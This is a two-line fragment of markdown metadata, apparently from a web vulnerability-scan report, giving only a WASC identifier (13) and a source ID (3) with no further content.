#### WASC Id: 13

#### Source ID: 3


